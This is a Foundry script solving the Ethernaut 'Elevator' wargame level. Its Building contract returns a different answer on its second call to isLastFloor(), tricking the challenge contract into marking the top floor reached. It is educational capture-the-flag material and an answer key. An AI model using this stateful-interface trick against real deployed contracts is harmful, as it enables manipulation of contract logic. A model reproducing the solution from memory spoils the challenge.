// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {Elevator} from "../../challenge-contracts/11-Elevator.sol";

contract ElevatorSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x6DcE47e94Fa22F8E2d8A7FDf538602B1F86aBFd2;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Deploy Building contract;
        Building building = new Building(challengeInstance);

        // Step 2: Call `goTopFloor()` function of the Building contract,
        building.goTopFloor();

        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(11));
    }
}

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Extra Contract)
// Additional contract codes to help solve this puzzle
////////////////////////////////////////////////////////////////////////////////////
contract Building {
    Elevator elevator;

    // State variable to track if isLastFloor has been called before
    bool private firstCall = true;

    // Total number of floors
    uint public totalFloors = 10;

    constructor(address elevatorAddress) {
        elevator = Elevator(elevatorAddress);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        // If it's the first call, return false
        if (firstCall) {
            firstCall = false; // Set firstCall to false for subsequent calls
            return false;
        }

        // After the first call, return true if the floor is the last floor
        return _floor == totalFloors;
    }

    function goTopFloor() external {
        elevator.goTo(totalFloors);
    }
}

////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Extra Contract)
////////////////////////////////////////////////////////////////////////////////////
